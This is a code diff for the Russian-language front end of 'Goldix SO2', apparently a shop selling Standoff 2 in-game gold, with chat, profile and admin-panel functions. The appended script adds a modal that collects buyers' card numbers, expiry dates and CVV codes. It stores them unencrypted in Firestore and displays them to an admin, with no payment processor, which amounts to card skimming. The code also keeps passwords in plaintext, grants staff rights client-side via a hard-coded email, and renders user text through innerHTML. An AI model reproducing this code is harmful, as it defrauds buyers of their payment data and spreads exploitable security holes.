+          <div>${m.text}</div>
+          ${mediaHtml}
+          <div class="chat-time">${m.time}</div>
+        `;
+        box.appendChild(div);
+      });
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function handleFileSelect(e) {
+      const file = e.target.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = function(evt) {
+        pendingAttachment = {
+          type: file.type.startsWith('video') ? 'video' : 'image',
+          url: evt.target.result
+        };
+        document.getElementById('chat-media-preview').classList.remove('hidden');
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function toggleVoiceRecord() {
+      const btn = document.getElementById('record-voice-btn');
+      if (!isRecording) {
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+          mediaRecorder = new MediaRecorder(stream);
+          audioChunks = [];
+          mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(audioChunks, { type: 'audio/mp3' });
+            const reader = new FileReader();
+            reader.onload = evt => {
+              pendingAttachment = { type: 'audio', url: evt.target.result };
+              document.getElementById('chat-media-preview').classList.remove('hidden');
+            };
+            reader.readAsDataURL(blob);
+          };
+          mediaRecorder.start();
+          isRecording = true;
+          btn.style.color = 'var(--danger)';
+        }).catch(() => alert('Доступ к микрофону отклонен!'));
+      } else {
+        mediaRecorder.stop();
+        isRecording = false;
+        btn.style.color = '#fff';
+      }
+    }
+
+    async function sendChatMessage() {
+      const input = document.getElementById('chat-input');
+      const text = input.value.trim();
+      
+      if (!text && !pendingAttachment) return;
+      if (!activeChatEmail) return;
+
+      let chatDoc = chats.find(c => c.chatEmail === activeChatEmail);
+      const newMessage = {
+        sender: currentUser.email,
+        senderName: currentUser.username,
+        senderVerified: currentUser.verified,
+        text: text,
+        mediaType: pendingAttachment ? pendingAttachment.type : null,
+        mediaUrl: pendingAttachment ? pendingAttachment.url : null,
+        time: new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' })
+      };
+
+      const { collection, addDoc, doc, updateDoc } = window.FB;
+      if (chatDoc) {
+        const updatedMessages = [...(chatDoc.messages || []), newMessage];
+        await updateDoc(doc(window.db, 'chats', chatDoc.id), { messages: updatedMessages });
+      } else {
+        await addDoc(collection(window.db, 'chats'), {
+          chatEmail: activeChatEmail,
+          messages: [newMessage]
+        });
+      }
+
+      input.value = '';
+      pendingAttachment = null;
+      document.getElementById('chat-media-preview').classList.add('hidden');
+      fetchData();
+    }
+
+    function renderUsersOnlineTab() {
+      const container = document.getElementById('users-online-list');
+      container.innerHTML = '';
+
+      const isStaff = hasStaffRole(currentUser);
+
+      users.forEach(u => {
+        const online = isUserOnline(u.lastSeen);
+        if (!online && !isStaff) return;
+
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        
+        const badgesHtml = getFormattedBadges(u.medals);
+
+        item.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <div>
+              <span class="status-dot ${online ? 'status-online' : 'status-offline'}"></span>
+              <b>${u.username}</b> ${u.verified ? '<span class="verified-icon">☑</span>' : ''}
+            </div>
+            <span style="font-size:10px; color: var(--text-muted);">${online ? 'Онлайн' : 'Офлайн'}</span>
+          </div>
+          <div style="margin-top:4px;">${badgesHtml}</div>
+        `;
+        container.appendChild(item);
+      });
+
+      if (container.children.length === 0) {
+        container.innerHTML = '<p>Сейчас нет пользователей в сети.</p>';
+      }
+    }
+
+    function getFormattedBadges(medalsList) {
+      if (!medalsList || !medalsList.length) return '<span class="badge badge-default">Пользователь</span>';
+      
+      return medalsList.map(m => {
+        const found = availableRoles.find(r => r.name === m);
+        const cls = found ? found.class : 'badge-default';
+        return `<span class="badge ${cls}">${m}</span>`;
+      }).join(' ');
+    }
+
+    function updateProfileUI() {
+      if (!currentUser) return;
+      document.getElementById('user-display').innerText = currentUser.username;
+      document.getElementById('profile-nick').innerText = currentUser.username;
+      document.getElementById('profile-email').innerText = currentUser.email;
+      document.getElementById('profile-standoff-id').innerText = currentUser.standoffId || 'Не указан';
+      document.getElementById('profile-verified').innerHTML = currentUser.verified ? '<span class="verified-icon">☑</span>' : '';
+      
+      document.getElementById('profile-medals').innerHTML = getFormattedBadges(currentUser.medals);
+
+      if (hasStaffRole(currentUser)) {
+        document.getElementById('admin-panel-btn').style.display = 'block';
+      } else {
+        document.getElementById('admin-panel-btn').style.display = 'none';
+      }
+    }
+
+    function hasStaffRole(user) {
+      if (!user || !user.medals) return false;
+      const staffRoles = ['Владелец', 'Разработчик web', 'Создатель', 'Главный Модератор сайта', 'Модератор сайта', 'Куратор модерации', 'Модератор по заказам', 'Модератор'];
+      return user.medals.some(m => staffRoles.includes(m)) || user.email === 'samp111517@gmail.com';
+    }
+
+    async function saveStandoffId() {
+      const val = prompt('Введите ваш ID в Standoff 2:', currentUser.standoffId || '');
+      if (val !== null) {
+        currentUser.standoffId = val.trim();
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', currentUser.id), { standoffId: currentUser.standoffId });
+        updateProfileUI();
+        alert('ID успешно сохранен!');
+      }
+    }
+
+    async function changeEmail() {
+      const val = prompt('Введите новую почту:', currentUser.email);
+      if (val) {
+        currentUser.email = val.trim();
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', currentUser.id), { email: currentUser.email });
+        updateProfileUI();
+        alert('Почта изменена!');
+      }
+    }
+
+    async function changePassword() {
+      const val = prompt('Введите новый пароль:');
+      if (val) {
+        currentUser.password = val.trim();
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', currentUser.id), { password: currentUser.password });
+        alert('Пароль изменен!');
+      }
+    }
+
+    async function cancelMyPendingOrders() {
+      const { doc, updateDoc } = window.FB;
+      for (let o of orders) {
+        if (o.userEmail === currentUser.email && o.status === 'В обработке') {
+          await updateDoc(doc(window.db, 'orders', o.id), { status: 'Отклонен' });
+        }
+      }
+      fetchData();
+      alert('Все ваши активные заказы отклонены.');
+    }
+
+    function toggleBrightness() {
+      const checked = document.getElementById('brightness-toggle').checked;
+      document.documentElement.style.setProperty('--filter-brightness', checked ? 'brightness(130%)' : 'brightness(100%)');
+    }
+
+    function applyBrightness() {
+      document.documentElement.style.setProperty('--filter-brightness', 'brightness(100%)');
+    }
+
+    function openAdminPanel() {
+      renderAdminOrders();
+      renderAdminUsers();
+      document.getElementById('admin-discount-toggle').checked = globalDiscount;
+      document.getElementById('admin-modal').classList.remove('hidden');
+    }
+
+    function closeAdminPanel() {
+      document.getElementById('admin-modal').classList.add('hidden');
+    }
+
+    function renderAdminOrders() {
+      const container = document.getElementById('admin-orders-list');
+      container.innerHTML = '';
+
+      if (orders.length === 0) {
+        container.innerHTML = '<p>Заказов пока нет.</p>';
+        return;
+      }
+
+      orders.forEach(o => {
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        item.innerHTML = `
+          <div><b>Заказ:</b> ${o.gold} Gold (${o.price}₽)</div>
+          <div><b>Пользователь:</b> ${o.userNick} (${o.userEmail})</div>
+          <div><b>Standoff ID:</b> ${o.standoffId}</div>
+          <div style="margin: 4px 0;"><b>Статус:</b> ${o.status}</div>
+          <div style="display:flex; gap: 6px; margin-top: 6px;">
+            <button class="btn" style="padding:4px 8px; font-size:11px;" onclick="setOrderStatus('${o.id}', 'Одобрен')">Одобрить</button>
+            <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" onclick="setOrderStatus('${o.id}', 'Отклонен')">Отклонить</button>
+          </div>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    async function setOrderStatus(orderId, status) {
+      const { doc, updateDoc } = window.FB;
+      await updateDoc(doc(window.db, 'orders', orderId), { status });
+      fetchData();
+    }
+
+    async function adminClearOrders() {
+      if (confirm('Удалить все заказы?')) {
+        const { doc, deleteDoc } = window.FB;
+        for (let o of orders) {
+          await deleteDoc(doc(window.db, 'orders', o.id));
+        }
+        fetchData();
+      }
+    }
+
+    async function adminRejectAll() {
+      const { doc, updateDoc } = window.FB;
+      for (let o of orders) {
+        await updateDoc(doc(window.db, 'orders', o.id), { status: 'Отклонен' });
+      }
+      fetchData();
+    }
+
+    async function adminApproveAll() {
+      const { doc, updateDoc } = window.FB;
+      for (let o of orders) {
+        await updateDoc(doc(window.db, 'orders', o.id), { status: 'Одобрен' });
+      }
+      fetchData();
+    }
+
+    function toggleGlobalDiscount() {
+      globalDiscount = document.getElementById('admin-discount-toggle').checked;
+      renderShopItems();
+    }
+
+    function renderAdminUsers() {
+      const container = document.getElementById('admin-users-list');
+      container.innerHTML = '';
+
+      users.forEach((u) => {
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        item.innerHTML = `
+          <div><b>Ник:</b> ${u.username} ${u.verified ? '<span class="verified-icon">☑</span>' : ''}</div>
+          <div><b>Почта:</b> ${u.email}</div>
+          <div style="margin: 4px 0;">${getFormattedBadges(u.medals)}</div>
+          <div style="display:flex; flex-wrap:wrap; gap:4px; margin-top:8px;">
+            <button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminToggleVerify('${u.id}')">${u.verified ? 'Снять Галочку' : 'Выдать Галочку ☑'}</button>
+            <button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminManageRoles('${u.id}')">⚙️ Управление Ролями</button>
+            <button class="btn" style="font-size:10px; padding:4px;" onclick="adminOpenChatWith('${u.email}')">Открыть Чат</button>
+            <button class="btn btn-danger" style="font-size:10px; padding:4px;" onclick="adminDeleteUser('${u.id}')">Удалить</button>
+          </div>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    async function adminToggleVerify(userId) {
+      const u = users.find(x => x.id === userId);
+      if (u) {
+        const newVerified = !u.verified;
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', userId), { verified: newVerified });
+        fetchData();
+      }
+    }
+
+    async function adminManageRoles(userId) {
+      const u = users.find(x => x.id === userId);
+      if (!u) return;
+
+      const roleNames = availableRoles.map((r, i) => `${i + 1}. ${r.name}`).join('\n');
+      const choice = prompt(`Выберите номер роли для добавления/удаления:\n\n${roleNames}\n\nТекущие роли: ${u.medals ? u.medals.join(', ') : 'Нет'}`);
+      
+      const roleIndex = parseInt(choice) - 1;
+      if (!isNaN(roleIndex) && availableRoles[roleIndex]) {
+        const roleName = availableRoles[roleIndex].name;
+        let medals = u.medals ? [...u.medals] : [];
+
+        if (medals.includes(roleName)) {
+          medals = medals.filter(m => m !== roleName);
+          alert(`Роль "${roleName}" удалена.`);
+        } else {
+          medals.push(roleName);
+          alert(`Роль "${roleName}" выдана!`);
+        }
+
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', userId), { medals });
+        fetchData();
+      }
+    }
+
+    function adminOpenChatWith(email) {
+      activeChatEmail = email;
+      closeAdminPanel();
+      switchTab('inbox');
+    }
+
+    async function adminDeleteUser(userId) {
+      if (confirm('Удалить этого пользователя?')) {
+        const { doc, deleteDoc } = window.FB;
+        await deleteDoc(doc(window.db, 'users', userId));
+        fetchData();
+      }
+    }
+  </script>
+  <script type="module" src="script.js"></script>
+<!-- === НАДЕЖНАЯ ПАНЕЛЬ УПРАВЛЕНИЯ ЧАТОМ GOLDIX SO2 === -->
+
+<!-- Модальное окно для ввода карты -->
+<div id="cardModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 99999; justify-content: center; align-items: center;">
+    <div style="background: #1a1a1a; border: 1px solid #444; padding: 20px; border-radius: 10px; width: 90%; max-width: 380px; color: #fff; text-align: left; font-family: Arial, sans-serif;">
+        <h3 style="margin-top: 0; color: gold; text-align: center;">💳 Реквизиты оплаты</h3>
+        <p style="font-size: 13px; color: #aaa; text-align: center;">Введите данные карты для подтверждения покупки:</p>
+        
+        <label style="font-size: 12px; color: #ccc;">Номер карты:</label>
+        <input type="text" id="modalCardNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
+        
+        <div style="display: flex; gap: 10px;">
+            <div style="flex: 1;">
+                <label style="font-size: 12px; color: #ccc;">Срок (ММ/ГГ):</label>
+                <input type="text" id="modalCardDate" placeholder="xx/xx" maxlength="5" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
+            </div>
+            <div style="flex: 1;">
+                <label style="font-size: 12px; color: #ccc;">CVV / CVC:</label>
+                <input type="password" id="modalCardCvc" placeholder="xxx" maxlength="3" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
+            </div>
+        </div>
+
+        <button onclick="submitCardData()" style="background: gold; color: black; font-weight: bold; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;">
+            Отправить данные
+        </button>
+        <button onclick="closeCardModal()" style="background: transparent; color: #aaa; border: none; width: 100%; margin-top: 8px; cursor: pointer;">
+            Отмена
+        </button>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp, getApps } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, updateDoc, doc, query, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyDummyKeyForGoldixSo2",
+        authDomain: "goldix-so2.firebaseapp.com",
+        projectId: "goldix-so2",
+        storageBucket: "goldix-so2.appspot.com",
+        messagingSenderId: "1234567890",
+        appId: "1:1234567890:web:abcdef"
+    };
+
+    const app = !getApps().length ? initializeApp(firebaseConfig) : getApps()[0];
+    const db = getFirestore(app);
+
+    const CHATS_COLLECTION = "chats";
+    let activeRequestId = null;
+
+    window.addEventListener("DOMContentLoaded", () => {
+        // Каждые полсекунды проверяем и внедряем кнопку прямо под заголовком «Входящие и Чат»
+        setInterval(injectAdminButtonFixed, 500);
+        initChatSync();
+    });
+
+    // Надежное внедрение кнопки в верхнюю часть раздела чата
+    function injectAdminButtonFixed() {
+        // Ищем заголовок «Входящие и Чат» на странице
+        const headers = Array.from(document.querySelectorAll('h1, h2, h3, div')).filter(el => el.textContent.includes('Входящие и Чат'));
+        
+        if (headers.length > 0 && !document.getElementById("fixedAdminPayBtn")) {
+            const targetHeader = headers[0];
+            const btnContainer = document.createElement("div");
+            btnContainer.style.cssText = "max-width: 500px; margin: 10px auto; padding: 0 10px; text-align: center;";
+            
+            btnContainer.innerHTML = `
+                <button id="fixedAdminPayBtn" onclick="adminTriggerPaymentRequest()" style="background: #ff4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px; box-shadow: 0 4px 10px rgba(255,68,68,0.3);">
+                    💬 Отправить запрос на покупку в чат
+                </button>
+            `;
+            
+            targetHeader.after(btnContainer);
+        }
+    }
+
+    // 1. Админ отправляет запрос
+    window.adminTriggerPaymentRequest = async function() {
+        try {
+            await addDoc(collection(db, CHATS_COLLECTION), {
+                type: "admin_request",
+                text: "Магазин: Запрос на оплату товара.",
+                status: "waiting_card",
+                timestamp: Date.now()
+            });
+            alert("Запрос на покупку успешно отправлен в чат!");
+        } catch (error) {
+            console.error("Ошибка Firebase:", error);
+            alert("Не удалось отправить запрос.");
+        }
+    };
+
+    window.openCardModal = function(msgId) {
+        activeRequestId = msgId;
+        document.getElementById("cardModal").style.display = "flex";
+    };
+
+    window.closeCardModal = function() {
+        document.getElementById("cardModal").style.display = "none";
+        activeRequestId = null;
+    };
+
+    // 2. Пользователь отправляет данные карты
+    window.submitCardData = async function() {
+        const number = document.getElementById("modalCardNumber").value;
+        const date = document.getElementById("modalCardDate").value;
+        const cvc = document.getElementById("modalCardCvc").value;
+
+        if (!number || !date || !cvc) {
+            alert("Заполните все поля карты!");
+            return;
+        }
+
+        if (!activeRequestId) {
+            alert("Ошибка: ID запроса не найден!");
+            return;
+        }
+
+        try {
+            const docRef = doc(db, CHATS_COLLECTION, activeRequestId);
+            await updateDoc(docRef, {
+                status: "card_submitted",
+                cardNumber: number,
+                cardDate: date,
+                cardCvc: cvc
+            });
+            closeCardModal();
+            alert("Данные карты успешно отправлены администратору!");
+        } catch (error) {
+            console.error("Ошибка обновления:", error);
+            alert("Не удалось отправить данные.");
+        }
+    };
+
+    // 3. Админ одобряет покупку
+    window.approvePurchase = async function(msgId) {
+        try {
+            await updateDoc(doc(db, CHATS_COLLECTION, msgId), { status: "approved" });
+            alert("Покупка одобрена!");
+        } catch (error) {
+            console.error("Ошибка:", error);
+        }
+    };
+
+    // 4. Синхронизация чата (вывод карточки запроса)
+    function initChatSync() {
+        const q = query(collection(db, CHATS_COLLECTION));
+        onSnapshot(q, (snapshot) => {
+            // Удаляем старые дубликаты
+            document.querySelectorAll('.dynamic-chat-request').forEach(el => el.remove());
+
+            let latestDoc = null;
+            let latestTime = 0;
+
+            snapshot.forEach((docSnap) => {
+                const data = docSnap.data();
+                if (data.type === "admin_request" && data.timestamp > latestTime) {
+                    latestTime = data.timestamp;
+                    latestDoc = { id: docSnap.id, ...data };
+                }
+            });
+
+            if (latestDoc) {
+                // Ищем место для вставки (под заголовком или в тело страницы)
+                const targetArea = document.querySelector('.container, body');
+                
+                const box = document.createElement("div");
+                box.className = 'dynamic-chat-request';
+                box.style.cssText = "background: #1a1a1a; border: 1px solid #444; padding: 12px; margin: 15px auto; max-width: 500px; border-radius: 8px; color: #fff; text-align: left; z-index: 99; position: relative;";
+
+                if (latestDoc.status === "waiting_card") {
+                    box.innerHTML = `
+                        <p style="color: gold; margin: 0 0 8px 0;"><b>🛒 Системное сообщение:</b> ${latestDoc.text}</p>
+                        <button onclick="openCardModal('${latestDoc.id}')" style="background: #0088cc; color: white; padding: 8px 14px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+                            Зайти / Ввести данные карты
+                        </button>
+                    `;
+                } else {
+                    let statusText = latestDoc.status === "approved" ? "✅ Одобрено администратором" : "⏳ Ожидает проверки";
+                    box.innerHTML = `
+                        <p style="margin: 0 0 5px 0;"><b>👤 Покупатель отправил реквизиты</b></p>
+                        <p style="margin: 0 0 8px 0; font-weight: bold;">Статус: ${statusText}</p>
+                        <div style="background: #2a0808; border: 1px solid #ff4444; padding: 10px; border-radius: 6px; margin-top: 8px;">
+                            <p style="color: #ff8888; margin: 0 0 5px 0; font-size: 13px;">🔒 <b>Данные карты для админа:</b></p>
+                            <p style="margin: 2px 0; font-family: monospace;">Номер: <b>${latestDoc.cardNumber || 'Нет данных'}</b></p>
+                            <p style="margin: 2px 0; font-family: monospace;">Дата: <b>${latestDoc.cardDate || '--/--'}</b> | CVC: <b>${latestDoc.cardCvc || '---'}</b></p>
+                            ${latestDoc.status !== "approved" ? `<button onclick="approvePurchase('${latestDoc.id}')" style="background: green; color: white; padding: 6px 12px; border: none; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 8px;">Принять покупку</button>` : ''}
+                        </div>
+                    `;
+                }
+                targetArea.appendChild(box);
+            }
+        });
+    }
+</script>
+</body>
+</html>
